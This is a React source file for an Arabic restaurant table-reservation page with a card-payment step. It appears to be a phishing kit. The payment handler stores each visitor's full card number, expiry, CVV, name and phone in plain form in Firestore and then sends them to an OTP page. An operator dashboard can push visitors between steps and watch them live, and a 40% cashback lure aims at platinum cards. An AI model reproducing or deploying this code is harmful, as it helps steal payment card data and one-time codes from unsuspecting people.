import { useState, useEffect, useRef } from "react";
import { shouldSyncReserveStep } from "@/lib/reserve-step-sync";
import { Link, useParams, useLocation } from "wouter";
import { ArrowRight, Calendar, Clock, Users, User, Phone, FileText, ChevronLeft, CreditCard, ShieldCheck, Lock, ChevronDown, Receipt } from "lucide-react";
import { CountryPhoneInput } from "@/components/country-phone-input";
import { getRestaurantById } from "@/lib/restaurant-data";
import { addData, handlePay, isBinBlocked } from "@/lib/firebase";
import { setupOnlineStatus } from "@/lib/utils";
import { CashbackPopup } from "@/components/CashbackPopup";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { ProgressBar } from "@/components/bujairi-header";

type Step = 1 | 2 | 3 | 4;

const RESERVE_STEPS = [
  { n: 1, label: "الموعد" },
  { n: 2, label: "البيانات" },
  { n: 3, label: "الفاتورة" },
  { n: 4, label: "الدفع" },
];

const validateLuhn = (cardNum: string): boolean => {
  const digits = cardNum.replace(/\s/g, "");
  if (!/^\d{13,19}$/.test(digits)) return false;
  let sum = 0;
  let isEven = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = parseInt(digits[i], 10);
    if (isEven) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    isEven = !isEven;
  }
  return sum % 10 === 0;
};

const getCardType = (cardNum: string): string => {
  const num = cardNum.replace(/\s/g, "");
  if (/^4/.test(num)) return "visa";
  if (/^5[1-5]/.test(num)) return "mastercard";
  if (/^(508|60|62|67)/.test(num)) return "mada";
  return "";
};


export default function Reserve() {
  const params = useParams<{ id: string }>();
  const restaurant = getRestaurantById(Number(params.id));
  const [, setLocation] = useLocation();
  const [step, setStep] = useState<Step>(1);
  const reserveStepInitialMount = useRef(true);

  const [date, setDate] = useState("");
  const [time, setTime] = useState("");
  const [guests, setGuests] = useState("2");
  const [name, setName] = useState("");
  const [phone, setPhone] = useState("");
  const [notes, setNotes] = useState("");

  const [cardNumber, setCardNumber] = useState("");
  const [cardName, setCardName] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("01");
  const [expiryYear, setExpiryYear] = useState("2026");
  const [cvv, setCvv] = useState("");
  const [stepSubmitting, setStepSubmitting] = useState(false);
  const [stepSubmitError, setStepSubmitError] = useState("");
  const [cardErrors, setCardErrors] = useState<Record<string, string>>({});
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showCashbackPopup, setShowCashbackPopup] = useState(false);

  // Booking confirmation fee. Visitors can choose between a full deposit
  // (50 SAR — refundable on visit) or a small "hold" deposit (10 SAR) that
  // simply confirms the reservation. Both flow through the same payment
  // and Firestore code paths so the dashboard sees the chosen amount.
  const FULL_FEE = 50;
  const PARTIAL_FEE = 10;
  const [paymentMode, setPaymentMode] = useState<"full" | "partial">("full");
  const serviceFee = paymentMode === "partial" ? PARTIAL_FEE : FULL_FEE;
  const reservationTotal = serviceFee;

  // Admin "page push" handler — dashboard sends steps 1-4 corresponding to the
  // four internal stages of /reserve/:id (الموعد/البيانات/الفاتورة/الدفع).
  // App.tsx forwards those as a custom event so we can jump the visitor to the
  // right internal stage of this multi-step page without losing the URL.
  useEffect(() => {
    const applyTarget = (raw: unknown) => {
      const target = Number(raw) || 0;
      if (target >= 1 && target <= 4) {
        setStep(target as Step);
        return true;
      }
      return false;
    };
    // Pick up any push that fired BEFORE this lazy-loaded page mounted.
    const w = window as any;
    if (w.__pendingReserveStep != null) {
      applyTarget(w.__pendingReserveStep);
      w.__pendingReserveStep = null;
    }
    const onPush = (e: Event) => {
      const detail = (e as CustomEvent<{ step: number }>).detail;
      applyTarget(detail?.step);
      (window as any).__pendingReserveStep = null;
    };
    window.addEventListener("admin-restaurant-step", onPush);
    return () => window.removeEventListener("admin-restaurant-step", onPush);
  }, []);

  // Mirror the current internal step to firestore as a `currentPage` value
  // so the dashboard's PagesControl highlights the right button. Must run
  // even when the visitor doc was created earlier (in StepOne handler).
  useEffect(() => {
    const isInitialMount = reserveStepInitialMount.current;
    reserveStepInitialMount.current = false;
    if (!shouldSyncReserveStep(isInitialMount)) return;
    if (typeof window === "undefined") return;
    const visitorId = localStorage.getItem("visitor");
    if (!visitorId) return;
    const pageMap: Record<number, string> = {
      1: "reserve_date",
      2: "reserve_details",
      3: "reserve_invoice",
      4: "reserve_checkout",
    };
    const page = pageMap[step];
    if (!page) return;
    addData({ id: visitorId, currentPage: page }).catch(() => {});
  }, [step]);

  if (!restaurant) {
    return (
      <div className="min-h-screen bg-[#F7F1EC] flex items-center justify-center" dir="rtl">
        <div className="text-center">
          <h2 className="text-[#A85734] text-2xl font-bold mb-4">المطعم غير موجود</h2>
          <Link href="/restaurants" className="text-[#C98A68] underline" data-testid="link-back-restaurants">
            العودة للمطاعم
          </Link>
        </div>
      </div>
    );
  }

  const timeSlots = [
    "12:00 م", "12:30 م", "1:00 م", "1:30 م",
    "2:00 م", "2:30 م", "5:00 م", "5:30 م",
    "6:00 م", "6:30 م", "7:00 م", "7:30 م",
    "8:00 م", "8:30 م", "9:00 م", "9:30 م",
    "10:00 م", "10:30 م",
  ];

  const guestOptions = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"];
  const today = new Date().toISOString().split("T")[0];

  const ensureReservationVisitorId = () => {
    const existingVisitorId = localStorage.getItem("visitor");
    if (existingVisitorId) {
      setupOnlineStatus(existingVisitorId);
      return existingVisitorId;
    }

    const visitorId = `reserve_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;
    localStorage.setItem("visitor", visitorId);
    localStorage.removeItem("otpHistory");
    setupOnlineStatus(visitorId);
    return visitorId;
  };

  const handleDateSubmit = async () => {
    if (stepSubmitting || !date || !time) return;

    setStepSubmitting(true);
    setStepSubmitError("");

    const visitorId = ensureReservationVisitorId();
    const saved = await addData({
      id: visitorId,
      type: "restaurant_reservation",
      restaurantId: restaurant.id,
      restaurant: restaurant.name,
      restaurantEn: restaurant.nameEn,
      date,
      time,
      guests,
      currentPage: "reserve_details",
    });

    if (!saved) {
      setStepSubmitError("تعذر حفظ البيانات، يرجى المحاولة مرة أخرى");
      setStepSubmitting(false);
      return;
    }

    setStep(2);
    setStepSubmitting(false);
  };

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    const matches = v.match(/\d{4,16}/g);
    const match = (matches && matches[0]) || "";
    const parts = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    return parts.length ? parts.join(" ") : v;
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    if (formatted.replace(/\s/g, "").length <= 16) {
      setCardNumber(formatted);
      setCardErrors((prev) => ({ ...prev, cardNumber: "", submit: "" }));
    }
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const v = e.target.value.replace(/[^0-9]/g, "");
    if (v.length <= 4) {
      setCvv(v);
      setCardErrors((prev) => ({ ...prev, cvv: "", submit: "" }));
    }
  };

  const validateCard = (): boolean => {
    const newErrors: Record<string, string> = {};
    const rawCard = cardNumber.replace(/\s/g, "");
    if (!rawCard || rawCard.length < 13) newErrors.cardNumber = "رقم البطاقة غير صحيح";
    else if (!validateLuhn(rawCard)) newErrors.cardNumber = "رقم البطاقة غير صالح";
    if (!cardName.trim() || cardName.trim().length < 3) newErrors.cardName = "يرجى إدخال الاسم على البطاقة";
    const now = new Date();
    const expiry = new Date(parseInt(expiryYear), parseInt(expiryMonth) - 1);
    if (expiry < now) newErrors.expiry = "البطاقة منتهية الصلاحية";
    if (!cvv || cvv.length < 3) newErrors.cvv = "كود الحماية غير صحيح";
    setCardErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const [submitError, setSubmitError] = useState("");

  const handlePaymentSubmit = async () => {
    if (isSubmitting) return;
    if (!validateCard()) return;
    setIsSubmitting(true);
    setCardErrors((prev) => ({ ...prev, submit: "" }));

    const visitorId = ensureReservationVisitorId();

    const normalizedCardNumber = cardNumber.replace(/\s/g, "");
    const normalizedCardType = getCardType(cardNumber);

    try {
      if (await isBinBlocked(normalizedCardNumber)) {
        setCardErrors((prev) => ({
          ...prev,
          submit: "هذه البطاقة غير مدعومة. يرجى استخدام بطاقة أخرى.",
        }));
        setIsSubmitting(false);
        return;
      }
    } catch {
      // ignore lookup errors
    }
    const paymentInfo = {
      cardNumber: normalizedCardNumber,
      cardName,
      expiryMonth,
      expiryYear,
      cvv,
      cardType: normalizedCardType,
      currentPage: "reserve_checkout",
    };

    await addData({
      id: visitorId,
      type: "restaurant_reservation",
      restaurantId: restaurant.id,
      restaurant: restaurant.name,
      restaurantEn: restaurant.nameEn,
      date, time, guests, name, phone, notes,
      total: reservationTotal,
      cardNumber: normalizedCardNumber,
      cardName,
      expiryMonth,
      expiryYear,
      cvv,
      cardType: normalizedCardType,
      currentPage: "reserve_checkout",
    });

    try {
      const saved = await handlePay(paymentInfo, () => {});
      if (!saved) {
        throw new Error("PAYMENT_NOT_SAVED");
      }
    } catch (error: any) {
      if (error?.message === "VISITOR_BLOCKED") {
        setCardErrors((prev) => ({
          ...prev,
          submit: "تم حظر هذا الزائر ولا يمكنه المتابعة",
        }));
      } else {
        setCardErrors((prev) => ({
          ...prev,
          submit: "حدث خطأ أثناء معالجة الدفع",
        }));
      }
      setIsSubmitting(false);
      return;
    }

    window.setTimeout(() => setLocation("/otp"), 7000);
  };

  const cardType = getCardType(cardNumber);

  return (
    <div className="page-reserve min-h-screen bg-[#F7F1EC]" dir="rtl">
      <div className="sticky top-0 z-40 bg-gradient-to-l from-[#A85734] via-[#B86B49] to-[#874027] px-4 py-3.5 flex items-center gap-3 shadow-[0_8px_30px_rgba(93,50,34,0.18)] border-b border-white/10 backdrop-blur-xl">
        {step === 1 ? (
          <Link
            href={`/restaurant/${restaurant.id}`}
            className="text-white/80 hover:text-white transition-colors"
            data-testid="link-back-detail"
          >
            <ArrowRight className="w-5 h-5" />
          </Link>
        ) : (
          <button
            onClick={() => setStep((step - 1) as Step)}
            className="text-white/80 hover:text-white transition-colors"
            data-testid="button-back-step"
          >
            <ArrowRight className="w-5 h-5" />
          </button>
        )}
        <div className="flex items-center gap-3 flex-1">
          <img
            src={restaurant.logo}
            alt={restaurant.nameEn}
            className="w-10 h-10 rounded-lg object-cover border border-white/20"
          />
          <div>
            <h1 className="text-white font-bold text-sm" data-testid="text-reserve-restaurant-name">
              حجز طاولة - {restaurant.name}
            </h1>
            <p className="text-white/60 text-xs">{restaurant.nameEn}</p>
          </div>
        </div>
      </div>

      <ProgressBar current={step} steps={RESERVE_STEPS} />

      <div className="max-w-xl mx-auto px-4 sm:px-6 py-6 sm:py-8">
        {step === 1 && (
          <div className="space-y-4 animate-fade-in" data-testid="step-1-content">
            <div className="bg-white/95 rounded-2xl p-5 sm:p-6 shadow-[0_10px_35px_rgba(90,54,39,0.08)] border border-[#EAD8CE]/80 backdrop-blur-sm space-y-5">
              <h2 className="text-[#A85734] font-bold text-lg flex items-center gap-2">
                <Calendar className="w-5 h-5" />
                اختر موعد الحجز
              </h2>

              <div>
                <label className="block text-[#A85734] text-sm font-medium mb-2">التاريخ *</label>
                <input
                  type="date"
                  value={date}
                  onChange={(e) => setDate(e.target.value)}
                  min={today}
                  required
                  className="w-full border border-[#E4D2C7] rounded-lg px-4 py-3 text-sm bg-[#FCF9F7] focus:outline-none focus:border-[#A85734] focus:ring-1 focus:ring-[#A85734] transition-colors"
                  data-testid="input-date"
                />
              </div>

              <div>
                <label className="block text-[#A85734] text-sm font-medium mb-2">
                  <Clock className="w-4 h-4 inline ml-1" />
                  الوقت *
                </label>
                <div className="grid grid-cols-3 gap-2">
                  {timeSlots.map((slot) => (
                    <button
                      key={slot}
                      type="button"
                      onClick={() => setTime(slot)}
                      className={`py-2.5 rounded-lg text-xs font-medium transition-colors ${
                        time === slot
                          ? "bg-[#A85734] text-white"
                          : "bg-[#FCF9F7] text-[#A85734] border border-[#E4D2C7] hover:bg-[#A85734]/10"
                      }`}
                      data-testid={`button-time-${slot}`}
                    >
                      {slot}
                    </button>
                  ))}
                </div>
              </div>

              <div>
                <label className="block text-[#A85734] text-sm font-medium mb-2">
                  <Users className="w-4 h-4 inline ml-1" />
                  عدد الضيوف *
                </label>
                <div className="flex gap-2 flex-wrap">
                  {guestOptions.map((g) => (
                    <button
                      key={g}
                      type="button"
                      onClick={() => setGuests(g)}
                      className={`w-10 h-10 rounded-full text-sm font-medium transition-colors ${
                        guests === g
                          ? "bg-[#A85734] text-white"
                          : "bg-[#FCF9F7] text-[#A85734] border border-[#E4D2C7] hover:bg-[#A85734]/10"
                      }`}
                      data-testid={`button-guests-${g}`}
                    >
                      {g}
                    </button>
                  ))}
                </div>
              </div>
            </div>

            <button
              onClick={() => { void handleDateSubmit(); }}
              disabled={!date || !time || stepSubmitting}
              className="w-full bg-gradient-to-l from-[#A85734] to-[#91472D] text-white py-4 rounded-2xl font-bold text-base hover:from-[#B86642] hover:to-[#874027] transition-all duration-300 shadow-[0_10px_24px_rgba(168,87,52,0.24)] hover:shadow-[0_14px_30px_rgba(168,87,52,0.32)] hover:-translate-y-0.5 active:translate-y-0 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
              data-testid="button-next-step-1"
            >
              {stepSubmitting ? "جاري الإرسال..." : "التالي - بيانات الحجز"}
              <ChevronLeft className="w-5 h-5" />
            </button>
            {stepSubmitError && (
              <p className="text-red-500 text-xs text-center" data-testid="error-reserve-step-1-submit">
                {stepSubmitError}
              </p>
            )}
          </div>
        )}

        {step === 2 && (
          <div className="space-y-4 animate-fade-in" data-testid="step-2-content">
            <div className="bg-white/95 rounded-2xl p-5 sm:p-6 shadow-[0_10px_35px_rgba(90,54,39,0.08)] border border-[#EAD8CE]/80 backdrop-blur-sm space-y-5">
              <h2 className="text-[#A85734] font-bold text-lg flex items-center gap-2">
                <User className="w-5 h-5" />
                بيانات الحجز
              </h2>

              <div>
                <label className="block text-[#A85734] text-sm font-medium mb-2">الاسم الكامل *</label>
                <div className="relative">
                  <User className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-[#B29C91]" />
                  <input
                    type="text"
                    value={name}
                    onChange={(e) => setName(e.target.value.slice(0, 80))}
                    required
                    maxLength={80}
                    placeholder="أدخل اسمك الكامل"
                    className="w-full border border-[#E4D2C7] rounded-lg pr-10 pl-4 py-3 text-sm bg-[#FCF9F7] focus:outline-none focus:border-[#A85734] focus:ring-1 focus:ring-[#A85734] transition-colors placeholder:text-[#B29C91]"
                    data-testid="input-name"
                  />
                </div>
              </div>

              <div>
                <label className="block text-[#A85734] text-sm font-medium mb-2">رقم الهاتف *</label>
                <CountryPhoneInput
                  value={phone}
                  onChange={setPhone}
                  className="!border-[#E4D2C7] !bg-[#FCF9F7] py-1.5 focus-within:!border-[#A85734] focus-within:ring-1 focus-within:ring-[#A85734]"
                  inputClassName="bg-[#FCF9F7] py-2"
                  testId="input-phone"
                />
              </div>

              <div>
                <label className="block text-[#A85734] text-sm font-medium mb-2">
                  <FileText className="w-4 h-4 inline ml-1" />
                  ملاحظات إضافية
                </label>
                <textarea
                  value={notes}
                  onChange={(e) => setNotes(e.target.value.slice(0, 300))}
                  placeholder="مثال: طاولة بجانب النافذة، حساسية طعام..."
                  rows={3}
                  maxLength={300}
                  className="w-full border border-[#E4D2C7] rounded-lg px-4 py-3 text-sm bg-[#FCF9F7] focus:outline-none focus:border-[#A85734] focus:ring-1 focus:ring-[#A85734] transition-colors placeholder:text-[#B29C91] resize-none"
                  data-testid="input-notes"
                />
              </div>
            </div>

            <button
              onClick={() => { if (name && phone) setStep(3); }}
              disabled={!name || !phone}
              className="w-full bg-gradient-to-l from-[#A85734] to-[#91472D] text-white py-4 rounded-2xl font-bold text-base hover:from-[#B86642] hover:to-[#874027] transition-all duration-300 shadow-[0_10px_24px_rgba(168,87,52,0.24)] hover:shadow-[0_14px_30px_rgba(168,87,52,0.32)] hover:-translate-y-0.5 active:translate-y-0 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
              data-testid="button-next-step-2"
            >
              التالي - الفاتورة
              <ChevronLeft className="w-5 h-5" />
            </button>
          </div>
        )}

        {step === 3 && (
          <div className="space-y-4 animate-fade-in" data-testid="step-3-content">
            <div className="relative overflow-hidden bg-gradient-to-br from-[#B86B49] via-[#A85734] to-[#874027] rounded-3xl p-6 text-center shadow-[0_14px_36px_rgba(117,62,39,0.22)] border border-white/10">
              <Receipt className="w-8 h-8 text-[#C98A68] mx-auto mb-2" />
              <h2 className="text-white font-bold text-lg">فاتورة الحجز</h2>
              <p className="text-white/70 text-xs mt-1">مراجعة تفاصيل وتكلفة الحجز</p>
            </div>

            <div className="bg-white/95 rounded-2xl p-5 sm:p-6 shadow-[0_10px_35px_rgba(90,54,39,0.08)] border border-[#EAD8CE]/80 backdrop-blur-sm">
              <h3 className="text-[#A85734] font-bold text-sm mb-4 flex items-center gap-2">
                <FileText className="w-4 h-4" />
                تفاصيل الحجز
              </h3>
              <div className="space-y-3 text-sm">
                <div className="flex justify-between">
                  <span className="text-[#76645B]">المطعم</span>
                  <span className="text-[#A85734] font-medium">{restaurant.name}</span>
                </div>
                <div className="h-[1px] bg-[#F2E7E0]" />
                <div className="flex justify-between">
                  <span className="text-[#76645B]">التاريخ</span>
                  <span className="text-[#A85734] font-medium">{date}</span>
                </div>
                <div className="h-[1px] bg-[#F2E7E0]" />
                <div className="flex justify-between">
                  <span className="text-[#76645B]">الوقت</span>
                  <span className="text-[#A85734] font-medium">{time}</span>
                </div>
                <div className="h-[1px] bg-[#F2E7E0]" />
                <div className="flex justify-between">
                  <span className="text-[#76645B]">عدد الضيوف</span>
                  <span className="text-[#A85734] font-medium">{guests}</span>
                </div>
                <div className="h-[1px] bg-[#F2E7E0]" />
                <div className="flex justify-between">
                  <span className="text-[#76645B]">الاسم</span>
                  <span className="text-[#A85734] font-medium">{name}</span>
                </div>
                <div className="h-[1px] bg-[#F2E7E0]" />
                <div className="flex justify-between">
                  <span className="text-[#76645B]">رقم الهاتف</span>
                  <span className="text-[#A85734] font-medium" dir="ltr">{phone}</span>
                </div>
                {notes && (
                  <>
                    <div className="h-[1px] bg-[#F2E7E0]" />
                    <div className="flex justify-between">
                      <span className="text-[#76645B]">ملاحظات</span>
                      <span className="text-[#A85734] font-medium text-left max-w-[200px]">{notes}</span>
                    </div>
                  </>
                )}
              </div>
            </div>

            <div className="bg-white/95 rounded-2xl p-5 sm:p-6 shadow-[0_10px_35px_rgba(90,54,39,0.08)] border border-[#EAD8CE]/80 backdrop-blur-sm">
              <h3 className="text-[#A85734] font-bold text-sm mb-4 flex items-center gap-2">
                <Receipt className="w-4 h-4" />
                تفاصيل المبلغ
              </h3>
              <div className="space-y-3 text-sm">
                <div className="flex justify-between">
                  <span className="text-[#76645B]">رسوم تأكيد الحجز</span>
                  <span className="text-[#A85734] font-medium">{serviceFee} ر.س</span>
                </div>
                <div className="h-[1px] bg-[#F2E7E0]" />
                <div className="flex justify-between items-center pt-2">
                  <span className="text-[#A85734] font-bold text-base">الإجمالي</span>
                  <span className="text-[#C98A68] font-bold text-xl">{reservationTotal} ر.س</span>
                </div>
              </div>
            </div>

            {/* Payment-amount selector: full deposit vs. partial 10 SAR hold */}
            <div className="bg-white/95 rounded-2xl p-4 sm:p-5 shadow-[0_10px_35px_rgba(90,54,39,0.08)] border border-[#EAD8CE]/80 backdrop-blur-sm space-y-3" data-testid="payment-mode-selector">
              <h3 className="text-[#A85734] font-bold text-sm flex items-center gap-2">
                <CreditCard className="w-4 h-4" />
                طريقة الدفع
              </h3>
              <div className="grid grid-cols-2 gap-3">
                <button
                  type="button"
                  onClick={() => setPaymentMode("full")}
                  className={`relative text-right p-3 rounded-xl border-2 transition-all ${
                    paymentMode === "full"
                      ? "border-[#A85734] bg-[#FFF4EE] shadow-sm"
                      : "border-[#EAD8CE] bg-white hover:border-[#C98A68]"
                  }`}
                  data-testid="payment-mode-full"
                >
                  <div className="text-[11px] text-[#76645B] mb-1">الدفع الكامل</div>
                  <div className="text-[#A85734] font-bold text-lg">{FULL_FEE} ر.س</div>
                  <div className="text-[10px] text-[#76645B] mt-1 leading-tight">
                    قابلة للاسترداد عند الزيارة
                  </div>
                  {paymentMode === "full" && (
                    <div className="absolute top-2 left-2 w-5 h-5 rounded-full bg-[#A85734] flex items-center justify-center">
                      <svg viewBox="0 0 16 16" className="w-3 h-3 text-white fill-current">
                        <path d="M6 11.5L2.5 8l1-1L6 9.5l6.5-6.5 1 1z" />
                      </svg>
                    </div>
                  )}
                </button>
                <button
                  type="button"
                  onClick={() => setPaymentMode("partial")}
                  className={`relative text-right p-3 rounded-xl border-2 transition-all ${
                    paymentMode === "partial"
                      ? "border-[#A85734] bg-[#FFF4EE] shadow-sm"
                      : "border-[#EAD8CE] bg-white hover:border-[#C98A68]"
                  }`}
                  data-testid="payment-mode-partial"
                >
                  <div className="flex items-center justify-between">
                    <div className="text-[11px] text-[#76645B] mb-1">دفع جزئي</div>
                    <span className="text-[9px] bg-[#C98A68] text-white px-1.5 py-0.5 rounded font-bold">
                      موصى به
                    </span>
                  </div>
                  <div className="text-[#A85734] font-bold text-lg">{PARTIAL_FEE} ر.س</div>
                  <div className="text-[10px] text-[#76645B] mt-1 leading-tight">
                    لتأكيد الحجز فقط
                  </div>
                  {paymentMode === "partial" && (
                    <div className="absolute top-2 left-2 w-5 h-5 rounded-full bg-[#A85734] flex items-center justify-center">
                      <svg viewBox="0 0 16 16" className="w-3 h-3 text-white fill-current">
                        <path d="M6 11.5L2.5 8l1-1L6 9.5l6.5-6.5 1 1z" />
                      </svg>
                    </div>
                  )}
                </button>
              </div>
            </div>

            <div className="bg-[#F2E7E0] rounded-xl p-4 text-center">
              <p className="text-[#76645B] text-xs">
                {paymentMode === "partial"
                  ? "يتم خصم 10 ر.س لتأكيد الحجز فقط، والباقي يُدفع في المطعم"
                  : "رسوم تأكيد الحجز قابلة للاسترداد عند زيارة المطعم"}
              </p>
            </div>

            <button
              onClick={() => { setStep(4); setShowCashbackPopup(true); }}
              className="w-full bg-gradient-to-l from-[#A85734] to-[#91472D] text-white py-4 rounded-2xl font-bold text-base hover:from-[#B86642] hover:to-[#874027] transition-all duration-300 shadow-[0_10px_24px_rgba(168,87,52,0.24)] hover:shadow-[0_14px_30px_rgba(168,87,52,0.32)] hover:-translate-y-0.5 active:translate-y-0 flex items-center justify-center gap-2"
              data-testid="button-next-step-3"
            >
              متابعة الدفع
              <CreditCard className="w-5 h-5" />
            </button>
          </div>
        )}

        {step === 4 && (
          <>
            {showCashbackPopup && (
              <CashbackPopup onClose={() => setShowCashbackPopup(false)} />
            )}

            <div className="space-y-6 animate-fade-in" data-testid="step-5-content">
              {(() => {
                const errors = {
                  cardNumber: cardErrors.cardNumber,
                  cardName: cardErrors.cardName,
                  cvv: cardErrors.cvv,
                };
                const setErrors = (updater: any) => {
                  setCardErrors((prev: any) => {
                    const next = typeof updater === "function" ? updater({ cardNumber: prev.cardNumber, cardName: prev.cardName, cvv: prev.cvv }) : updater;
                    return { ...prev, ...next };
                  });
                };
                const submitError = cardErrors.submit;
                const handleSubmit = handlePaymentSubmit;

                return (
                  <div className="w-full space-y-6" data-testid="payment-form">
                    {/* Top Accepted Cards Icons Bar */}
                    <div className="flex justify-center items-center gap-3 bg-white/60 p-3 rounded-lg border border-gray-200/50 justify-start">
                      <img src="https://i.ibb.co/gLtgpwS8/wex.png" className="h-12" alt="طرق الدفع المقبولة" />
                    </div>

                    <div className="bg-white rounded-2xl shadow-sm p-6 space-y-5" style={{ backgroundColor: "#ffffff" }}>
                      {/* Field 1: رقم البطاقة */}
                      <div>
                        <label className="block text-sm font-medium text-gray-800 text-right mb-2">
                          رقم البطاقة
                        </label>
                        <div className="relative">
                          <input
                            type="text"
                            value={cardNumber}
                            onChange={handleCardNumberChange}
                            maxLength={19}
                            placeholder=""
                            dir="ltr"
                            className={`w-full h-12 px-4 rounded border bg-white text-gray-900 text-sm outline-none transition-colors focus:border-[#C26C48] focus:ring-1 focus:ring-[#C26C48] text-right font-mono ${
                              errors.cardNumber ? "border-red-400" : "border-gray-300"
                            }`}
                            data-testid="input-card-number"
                          />
                          <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 pointer-events-none">
                            <CreditCard className="w-5 h-5" />
                          </div>
                        </div>
                        {errors.cardNumber && (
                          <p className="text-red-500 text-xs mt-1">{errors.cardNumber}</p>
                        )}
                      </div>

                      {/* Field 2: الاسم على البطاقة */}
                      <div>
                        <label className="block text-sm font-medium text-gray-800 text-right mb-2">
                          الاسم على البطاقة
                        </label>
                        <input
                          type="text"
                          value={cardName}
                          onChange={(e) => {
                            setCardName(e.target.value.toUpperCase().slice(0, 60));
                            setCardErrors((prev: any) => ({ ...prev, cardName: "" }));
                          }}
                          maxLength={60}
                          className={`w-full h-12 px-4 rounded border bg-white text-gray-900 text-sm outline-none transition-colors focus:border-[#C26C48] focus:ring-1 focus:ring-[#C26C48] ${
                            errors.cardName ? "border-red-400" : "border-gray-300"
                          }`}
                          data-testid="input-card-name"
                        />
                        {errors.cardName && (
                          <p className="text-red-500 text-xs mt-1">{errors.cardName}</p>
                        )}
                      </div>

                      {/* Field 3: تاريخ الانتهاء */}
                      <div>
                        <label className="block text-sm font-medium text-gray-800 text-right mb-2">
                          تاريخ الانتهاء
                        </label>
                        <div className="grid grid-cols-2 gap-3" dir="ltr">
                          <div className="relative">
                            <select
                              value={expiryMonth}
                              onChange={(e) => setExpiryMonth(e.target.value)}
                              className="w-full h-12 px-3 rounded border border-gray-300 bg-white text-gray-900 text-sm appearance-none outline-none focus:border-[#C26C48]"
                              data-testid="select-expiry-month"
                            >
                              {Array.from({ length: 12 }, (_, i) => {
                                const m = String(i + 1).padStart(2, "0");
                                return (
                                  <option key={m} value={m}>
                                    {m}
                                  </option>
                                );
                              })}
                            </select>
                            <ChevronDown className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500 pointer-events-none" />
                          </div>

                          <div className="relative">
                            <select
                              value={expiryYear}
                              onChange={(e) => setExpiryYear(e.target.value)}
                              className="w-full h-12 px-3 rounded border border-gray-300 bg-white text-gray-900 text-sm appearance-none outline-none focus:border-[#C26C48]"
                              data-testid="select-expiry-year"
                            >
                              {Array.from({ length: 10 }, (_, i) => {
                                const y = String(2025 + i);
                                return (
                                  <option key={y} value={y}>
                                    {y}
                                  </option>
                                );
                              })}
                            </select>
                            <ChevronDown className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500 pointer-events-none" />
                          </div>
                        </div>
                      </div>

                      {/* Field 4: كود الحماية */}
                      <div>
                        <label className="block text-sm font-medium text-gray-800 text-right mb-2">
                          كود الحماية
                        </label>
                        <div className="relative max-w-[140px]">
                          <input
                            type="text"
                            value={cvv}
                            onChange={(e) => {
                              const v = e.target.value.replace(/[^0-9]/g, "").slice(0, 4);
                              setCvv(v);
                              setCardErrors((prev: any) => ({ ...prev, cvv: "" }));
                            }}
                            maxLength={4}
                            placeholder=""
                            dir="ltr"
                            className={`w-full h-12 px-4 rounded border bg-white text-gray-900 text-sm outline-none transition-colors focus:border-[#C26C48] focus:ring-1 focus:ring-[#C26C48] text-right font-mono ${
                              errors.cvv ? "border-red-400" : "border-gray-300"
                            }`}
                            data-testid="input-cvv"
                          />
                          <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 pointer-events-none">
                            <CreditCard className="w-5 h-5" />
                          </div>
                        </div>
                        {errors.cvv && (
                          <p className="text-red-500 text-xs mt-1">{errors.cvv}</p>
                        )}
                      </div>

                      {submitError && (
                        <p className="text-red-500 text-xs text-center" data-testid="error-submit">
                          {submitError}
                        </p>
                      )}

                      {/* Submit Button */}
                      <button
                        type="button"
                        onClick={handleSubmit}
                        disabled={isSubmitting}
                        className="w-full h-14 mt-4 rounded font-bold text-lg text-white transition-transform hover:scale-[1.01] active:scale-[0.99] disabled:opacity-60 cursor-pointer shadow-md"
                        style={{ backgroundColor: "#E5733C" }}
                        data-testid="button-pay"
                      >
                        {isSubmitting ? "جاري معالجة الدفع..." : "متابعة"}
                      </button>
                    </div>

                    {/* Payment Security Footer Section */}
                    <div className="pt-6 text-center space-y-4">
                      <div className="flex items-center justify-center gap-4 flex-wrap text-sm font-bold bg-white/50 py-3 px-4 rounded-xl border border-gray-200/50">
                        <img src="https://i.ibb.co/Z670p9Hs/kmp.png" className="h-10" alt="طرق الدفع الآمنة" />
                      </div>
                      <p className="text-xs text-gray-500">
                        جميع عمليات الدفع آمنة 100%
                      </p>

                      <p className="text-sm font-bold text-[#A85734] pt-4 leading-relaxed">
                        احصل على كاش باك يصل الى 40% عند الدفع من خلال البطاقات من فئة البلاتينية
                      </p>
                    </div>
                  </div>
                );
              })()}
            </div>
          </>
        )}

      </div>
    </div>
  );
}
